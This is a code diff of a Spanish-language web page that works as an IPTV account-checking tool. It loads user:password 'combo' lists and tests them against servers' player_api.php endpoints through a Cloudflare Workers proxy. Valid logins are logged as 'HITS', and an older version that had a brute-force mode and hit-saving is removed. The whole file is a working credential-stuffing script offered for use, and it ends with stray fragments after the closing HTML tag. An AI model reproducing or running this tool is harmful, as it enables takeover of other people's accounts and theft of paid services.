@@ -1,108 +1,295 @@
-<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1" /><title>SOYMARKITOSTOYS - SCANNER</title><style>  * { box-sizing: border-box; margin: 0; padding: 0; }    /* Paleta Neo-Futurista: Fondo Cyber-Negro, Detalles Verde Neón Eléctrico y Oro */  body { background-color: #05080c; color: #39ff14; font-family: 'Segoe UI', sans-serif; user-select: none; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }    #main-app { width: 100%; max-width: 900px; margin: 0 auto; padding: 25px; background: #0d1117; border-radius: 16px; box-shadow: 0 0 30px rgba(57, 255, 20, 0.25); border: 1px solid #39ff14; }    h1 { text-align: center; margin-bottom: 25px; text-shadow: 0 0 15px #39ff14; display: flex; align-items: center; justify-content: center; gap: 12px; font-size: 2.2rem; color: #fff; }    .rayo-icono { font-size: 2.5rem; filter: drop-shadow(0 0 10px #ffaa00); animation: brillo 2s infinite; }    @keyframes brillo { 0% { filter: drop-shadow(0 0 5px #ffaa00); } 50% { filter: drop-shadow(0 0 15px #ffaa00); } 100% { filter: drop-shadow(0 0 5px #ffaa00); } }    .titulo-texto { background: linear-gradient(135deg, #39ff14, #00ffcc); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900; }      /* Estilo corregido para forzar una sola línea en móviles */  .creditos-autor { text-align: center; font-size: 0.95rem; color: #ffd700; margin-top: 25px; font-weight: 900; font-family: 'Courier New', monospace; letter-spacing: 2px; text-shadow: 0 0 12px #ffd700, 0 0 20px rgba(255, 215, 0, 0.5); border-top: 1px dashed rgba(57, 255, 20, 0.2); padding-top: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }    textarea, input[type="number"], input[type="file"] { width: 100%; margin-bottom: 15px; padding: 12px; border-radius: 10px; border: 2px solid #39ff14; background: #020408; color: #39ff14; outline: none; font-family: monospace; }    textarea:focus, input[type="number"]:focus { box-shadow: 0 0 10px rgba(57, 255, 20, 0.5); }  label { font-weight: 600; display: block; margin-bottom: 5px; color: #fff; letter-spacing: 0.5px; }      .btn { background: #39ff14; border: none; color: #05080c; font-weight: bold; padding: 12px 24px; border-radius: 8px; cursor: pointer; margin: 5px 8px 5px 0; font-size: 1.1rem; transition: all 0.3s; min-width: 140px; text-shadow: none; }    .btn:hover { background: #00ffcc; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 204, 0.4); color: #05080c; }    .btn.running { background: #ff3c38; color: #fff; animation: pulse 1.5s infinite; }    .btn.bruteforce-active { background: #ff9800 !important; color: #000 !important; border: 2px solid #ffaa00; box-shadow: 0 0 15px #ff9800; }    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.8; } 100% { opacity: 1; } }        /* Status bar Neo-Futurista */    #status-bar {     margin: 20px 0;     padding: 15px;     background: #020408;     border-radius: 12px;     border: 2px solid #39ff14;     color: #39ff14 !important;     text-align: center;     box-shadow: inset 0 0 10px rgba(57, 255, 20, 0.2);  }      #status-bar span,   #status-bar span span,  .separator {    color: #39ff14 !important;  }        .tabs { margin-top: 20px; display: flex; gap: 5px; }    .tab-btn { background: transparent; border: 2px solid #39ff14; border-bottom: none; padding: 10px 25px; color: #39ff14; cursor: pointer; font-weight: bold; border-radius: 12px 12px 0 0; transition: all 0.2s; }    .tab-btn.active { background: #39ff14; color: #05080c; }      .tab-content { background: #020408; border: 2px solid #39ff14; padding: 20px; height: 350px; overflow-y: auto; border-radius: 0 12px 12px 12px; color: #39ff14; font-family: 'Courier New', monospace; white-space: pre-wrap; }    pre { margin: 10px 0; padding: 15px; background: #0d1117; border-radius: 10px; border: 1px solid #39ff14; color: #fff; box-shadow: inset 0 0 8px rgba(57, 255, 20, 0.1); }      .btn-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 20px 0; justify-content: center; }    .server-status { margin: 15px 0; padding: 15px; background: #020408; border-radius: 12px; border: 2px solid #39ff14; }    #serverList { display: flex; flex-direction: column; gap: 8px; }    .server-item { display: flex; align-items: center; gap: 12px; padding: 12px; background: #0d1117; border-radius: 8px; border: 1px solid rgba(57, 255, 20, 0.2); }    .status-indicator { width: 12px; height: 12px; border-radius: 50%; }    .status-indicator.online { background: #39ff14; box-shadow: 0 0 10px #39ff14; }    .status-indicator.offline { background: #ff3c38; box-shadow: 0 0 10px #ff3c38; }    .status-indicator.checking { background: #ffd700; box-shadow: 0 0 10px #ffd700; }    .server-url { flex: 1; color: #fff; word-break: break-all; }      .bruteforce-panel { background: #020408; border: 2px solid #39ff14; border-radius: 12px; padding: 20px; margin: 20px 0; }    .bruteforce-header { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; }    .server-group-header { background: #0d1117; color: #39ff14; padding: 8px 12px; margin: 15px 0 5px 0; border-radius: 6px; font-weight: bold; border-left: 4px solid #39ff14; }    .log-hit, .log-fail, .log-error, .log-info { color: #39ff14 !important; }    #btn-toggle-bruteforce { display: flex; align-items: center; justify-content: center; }</style></head><body><div id="main-app">    <h1><span class="titulo-texto">🐲 SoyMarkitosToys 🐉</span></h1>      <label for="servidores">📡 Servidores (uno por linea)</label>    <textarea id="servidores" rows="4" placeholder="ej: http://servidor1.com:80&#10;https://servidor2.com:80" oninput="verificarServidoresEnTiempoReal()"></textarea>        <div id="serverStatusContainer" class="server-status" style="display: none;">        <h4>🌐 Estado de Servidores:</h4>        <div id="serverList"></div>    </div>        <div class="bruteforce-panel">        <div class="bruteforce-header">            <h3>⚡ MODO FUERZA BRUTA</h3>            <button id="btn-toggle-bruteforce" class="btn">ACTIVAR BRUTEFORCE</button>        </div>    </div>        <label for="comboFile1">Archivo Combo 1</label>    <input type="file" id="comboFile1" accept=".txt" style="margin-bottom:8px" />    <label for="comboFile2">Archivo Combo 2</label>    <input type="file" id="comboFile2" accept=".txt" style="margin-bottom:8px" />    <label for="comboFile3">Archivo Combo 3</label>    <input type="file" id="comboFile3" accept=".txt" />        <label for="threads">⚙️ Hilos (1 a 50)</label>    <input type="number" id="threads" min="1" max="50" value="10" />        <div class="btn-group">        <button id="btn-start" class="btn btn-start">INICIAR ESCANEO</button>        <button id="btn-save-combos" class="btn btn-save-combos">GUARDAR COMBOS</button>        <button id="btn-save-hits" class="btn btn-save-hits">GUARDAR HITS</button>        <button id="btn-clear" class="btn btn-clear">LIMPIAR TODO</button>  </div>          <div id="status-bar">        <span>Estado: <span id="statusText">Detenido</span></span> <span class="separator">|</span>        <span>Verificados: <span id="checkedCount">0</span></span> <span class="separator">|</span>        <span>Hits: <span id="hitsCount">0</span></span> <span class="separator">|</span>        <span>CPM: <span id="cpmCount">0</span></span> <span class="separator">|</span>        <span>Total Combos: <span id="totalCount">0</span></span>        <span id="serversOnlineCount" style="display:none;">0</span>        <span id="serversTotalCount" style="display:none;">0</span>    </div>        <div class="tabs">        <button class="tab-btn active" data-tab="activity">📋 Actividad</button>        <button class="tab-btn" data-tab="hits">✅ Hits</button>    </div>        <div id="activity" class="tab-content"></div>    <div id="hits" class="tab-content" style="display:none;"></div>    <div class="creditos-autor">⚡ HECHO POR AMBROSINI ⚡</div></div><script>
-        // 🛠️ PEGA TU URL DE CLOUDFLARE WORKERS AQUÍ ABAJO:
-        const PROXY_URL = "https://billowing-boundless-56f8.ambrosinigamers.workers.dev/";
-
-        let isBruteforceMode = false;
-        let serverStatus = new Map();
-        let onlineServers = [];
-        let isScanning = false;
-        let abortControllers = [];
-        let startTime, cpmInterval;
-        let serversWithHits = new Set();
-        let sessionFileName = null;
-        let accumulatedHits = [];
-
-        function getServerDisplayName(serverUrl) {
-            try {
-                let clean = serverUrl.replace(/^https?:\/\//, '');
-                clean = clean.replace(/:\d+$/, '');
-                clean = clean.replace(/\/$/, '');
-                return clean;
-            } catch { return serverUrl; }
-        }
-        function getServerNameForFile(serverUrl) {
-            try {
-                let clean = serverUrl.replace(/^https?:\/\//, '');
-                clean = clean.replace(/:\d+$/, '');
-                clean = clean.replace(/\/$/, '');
-                clean = clean.replace(/[^a-zA-Z0-9]/g, '_');
-                return clean;
-            } catch { return 'unknown'; }
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HITS AMBROSINI SCANNER</title>
+    <style>
+        :root {
+            --bg-color: #0d0d1a;
+            --card-bg: #1a1a2e;
+            --accent-color: #e91e63;
+            --text-color: #ffffff;
+            --success-color: #2ecc71;
+            --fail-color: #e74c3c;
         }
 
-        document.getElementById('btn-toggle-bruteforce').addEventListener('click', function() {
-            isBruteforceMode = !isBruteforceMode;
-            const btn = this;
-            if (isBruteforceMode) {
-                btn.textContent = 'DESACTIVAR BRUTEFORCE';
-                btn.classList.add('bruteforce-active');
-                log('activity', '⚡ MODO FUERZA BRUTA ACTIVADO', 'info');
-            } else {
-                btn.textContent = 'ACTIVAR BRUTEFORCE';
-                btn.classList.remove('bruteforce-active');
-                log('activity', '🔵 MODO NORMAL ACTIVADO', 'info');
-            }
-        });
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
 
-        async function verificarServidor(serverUrl) {
-            const serverClean = serverUrl.trim().replace(/\/$/, '');
-            try {
-                const controller = new AbortController();
-                const timeoutId = setTimeout(() => controller.abort(), 5000);
+        .container {
+            width: 100%;
+            max-width: 800px;
+            background-color: var(--card-bg);
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+            border: 1px solid rgba(233, 30, 99, 0.2);
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--accent-color);
+            margin-bottom: 25px;
+            font-size: 2rem;
+            text-shadow: 0 0 10px rgba(233, 30, 99, 0.5);
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #b3b3cc;
+        }
+
+        textarea {
+            width: 100%;
+            height: 120px;
+            background-color: #0d0d1a;
+            border: 1px solid #333355;
+            border-radius: 8px;
+            color: white;
+            padding: 10px;
+            box-sizing: border-box;
+            resize: vertical;
+            font-family: monospace;
+        }
+
+        textarea:focus {
+            border-color: var(--accent-color);
+            outline: none;
+        }
+
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        #startBtn {
+            background-color: var(--accent-color);
+            color: white;
+        }
+
+        #startBtn:hover {
+            background-color: #c21350;
+            box-shadow: 0 0 15px rgba(233, 30, 99, 0.4);
+        }
+
+        #stopBtn {
+            background-color: #333355;
+            color: white;
+        }
+
+        .status-panel {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .status-card {
+            background-color: #0d0d1a;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #222244;
+        }
+
+        .status-card .number {
+            font-size: 1.8rem;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+
+        .hits { color: var(--success-color); }
+        .fails { color: var(--fail-color); }
+        .tested { color: #3498db; }
+
+        .results-box {
+            background-color: #0d0d1a;
+            border: 1px solid #222244;
+            border-radius: 8px;
+            padding: 15px;
+            height: 250px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .log-entry {
+            margin-bottom: 6px;
+            padding: 4px 8px;
+            border-radius: 4px;
+        }
+
+        .log-hit { background-color: rgba(46, 204, 113, 0.15); color: var(--success-color); border-left: 4px solid var(--success-color); }
+        .log-fail { background-color: rgba(231, 76, 60, 0.1); color: var(--fail-color); }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>HITS AMBROSINI SCANNER</h1>
+
+    <div class="input-group">
+        <label for="servers">Servidores IPTV (Uno por línea):</label>
+        <textarea id="servers" placeholder="http://ejemplo.com:8080"></textarea>
+    </div>
+
+    <div class="input-group">
+        <label for="combos">Combos (usuario:contraseña):</label>
+        <textarea id="combos" placeholder="usuario:contraseña"></textarea>
+    </div>
+
+    <div class="controls">
+        <button id="startBtn" onclick="startScan()">Iniciar Escaneo</button>
+        <button id="stopBtn" onclick="stopScan()">Detener</button>
+    </div>
+
+    <div class="status-panel">
+        <div class="status-card">
+            <div>Probados</div>
+            <div id="countTested" class="number tested">0</div>
+        </div>
+        <div class="status-card">
+            <div>Hits (Válidas)</div>
+            <div id="countHits" class="number hits">0</div>
+        </div>
+        <div class="status-card">
+            <div>Fails</div>
+            <div id="countFails" class="number fails">0</div>
+        </div>
+    </div>
+
+    <label>Consola de Resultados:</label>
+    <div id="results" class="results-box"></div>
+</div>
+
+<script>
+    // URL Corregida en base a tu captura real de Cloudflare (billowing-bonus-50c6)
+    const PROXY_URL = "https://billowing-bonus-50c6.ambrosinigamers.workers.dev/?url=";
+
+    let scanning = false;
+    let hits = 0;
+    let fails = 0;
+    let tested = 0;
+
+    function log(message, type) {
+        const resultsDiv = document.getElementById('results');
+        const entry = document.createElement('div');
+        entry.className = `log-entry ${type === 'hit' ? 'log-hit' : 'log-fail'}`;
+        entry.innerText = message;
+        resultsDiv.appendChild(entry);
+        resultsDiv.scrollTop = resultsDiv.scrollHeight;
+    }
+
+    function stopScan() {
+        scanning = false;
+        log("⚠️ Escaneo detenido por el usuario.", "fail");
+    }
+
+    async function startScan() {
+        if (scanning) return;
+        
+        const serversText = document.getElementById('servers').value.trim();
+        const combosText = document.getElementById('combos').value.trim();
+
+        if (!serversText || !combosText) {
+            alert("Por favor introduce los servidores y los combos.");
+            return;
+        }
+
+        const servers = serversText.split('\n').map(s => s.trim()).filter(s => s);
+        const combos = combosText.split('\n').map(c => c.trim()).filter(c => c);
+
+        scanning = true;
+        hits = 0;
+        fails = 0;
+        tested = 0;
+        
+        document.getElementById('countHits').innerText = '0';
+        document.getElementById('countFails').innerText = '0';
+        document.getElementById('countTested').innerText = '0';
+        document.getElementById('results').innerHTML = '';
+
+        log("🚀 Iniciando escaneo a través de Cloudflare Proxy...", "hit");
+
+        for (const server of servers) {
+            for (const combo of combos) {
+                if (!scanning) break;
+
+                const [username, password] = combo.split(':');
+                if (!username || !password) continue;
+
+                const targetUrl = `${server}/player_api.php?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;
+                const finalRequestUrl = PROXY_URL + encodeURIComponent(targetUrl);
+
+                try {
+                    const response = await fetch(finalRequestUrl, {
+                        method: 'GET',
+                        headers: { 'Accept': 'application/json' }
+                    });
+
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        if (data.user_info && data.user_info.auth === 1 && data.user_info.status === "Active") {
+                            hits++;
+                            document.getElementById('countHits').innerText = hits;
+                            log(`🔥 HIT! -> ${server} | ${username}:${password} | Estado: Activo`, "hit");
+                        } else {
+                            fails++;
+                            document.getElementById('countFails').innerText = fails;
+                            log(`❌ FAIL -> ${server} | ${username}:${password}`, "fail");
+                        }
+                    } else {
+                        fails++;
+                        document.getElementById('countFails').innerText = fails;
+                        log(`⚠️ ERROR HTTP ${response.status} -> ${server}`, "fail");
+                    }
+                } catch (err) {
+                    fails++;
+                    document.getElementById('countFails').innerText = fails;
+                    log(`📡 Error de conexión o bloqueo -> ${server}`, "fail");
+                }
+
+                tested++;
+                document.getElementById('countTested').innerText = tested;
                 
-                // Mapeado para pasar a través del Proxy CORS
-                const urlDestino = `${serverClean}/player_api.php`;
-                const urlProxy = `${PROXY_URL}?url=${encodeURIComponent(urlDestino)}`;
-
-                await fetch(urlProxy, { signal: controller.signal });
-                clearTimeout(timeoutId);
-                return { online: true, url: serverClean };
-            } catch { return { online: false, url: serverClean }; }
-        }
-
-        async function verificarServidoresEnTiempoReal() {
-            const textarea = document.getElementById('servidores');
-            if (!textarea) return;
-            const servers = textarea.value.trim().split('\n').filter(s => s.trim() !== '');
-            const container = document.getElementById('serverStatusContainer');
-            const serverList = document.getElementById('serverList');
-            const serversOnlineSpan = document.getElementById('serversOnlineCount');
-            const serversTotalSpan = document.getElementById('serversTotalCount');
-                  if (servers.length === 0) {
-                if (container) container.style.display = 'none';
-                if (serversOnlineSpan) serversOnlineSpan.textContent = '0';
-                if (serversTotalSpan) serversTotalSpan.textContent = '0';
-                onlineServers = [];
-                return;
+                await new Promise(resolve => setTimeout(resolve, 200));
             }
-                  if (container) container.style.display = 'block';
-            if (serversTotalSpan) serversTotalSpan.textContent = servers.length;
-                  serverStatus.clear();
-            if (serverList) serverList.innerHTML = '';
-            onlineServers = [];
-                  servers.forEach((server, index) => {
-                if (!serverList) return;
-                const item = document.createElement('div');
-                item.className = 'server-item checking';
-                item.id = `server-${index}`;
-                item.innerHTML = `<span class="status-indicator checking"></span><span class="server-url">${server.trim()}</span><span class="server-status-text">Verificando...</span>`;
-                serverList.appendChild(item);
-            });
-                  const promises = servers.map(async (server, index) => {
-                const res = await verificarServidor(server);
-                const item = document.getElementById(`server-${index}`);
-                if (!item) return;
-                if (res.online) {
-                    item.className = 'server-item online';
-                    item.querySelector('.status-indicator').className = 'status-indicator online';
-                    item.querySelector('.server-status-text').textContent = 'Online ✅';
-                    serverStatus.set(server.trim(), true);
-                    onlineServers.push(server.trim());
-                } else {
-                    item.className = 'server-item offline';
-                    item.querySelector('.status-indicator').className = 'status-indicator offline';
-                    item.querySelector('.server-status-text').textContent = 'Offline ❌';
-                    serverStatus.set(server.trim(), false);
+        }
+        scanning = false;
+        log("🏁 Escaneo finalizado.", "hit");
+    }
+</script>
+
+</body>
+</html>                    serverStatus.set(server.trim(), false);
                 }
                 if (serversOnlineSpan) serversOnlineSpan.textContent = onlineServers.length;
             });
